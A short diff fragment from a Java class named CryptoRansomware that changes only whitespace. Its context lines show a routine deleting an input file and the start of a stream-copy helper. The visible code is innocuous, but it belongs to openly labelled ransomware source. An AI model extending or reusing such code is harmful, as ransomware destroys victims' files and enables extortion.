@@ -140,7 +140,7 @@ public class CryptoRansomware {
         boolean bool = in.delete();
         System.out.println("File deleted: " + bool);
     }
-
+ 
 
     private static void copy(InputStream is, OutputStream os) throws IOException {
         int i;
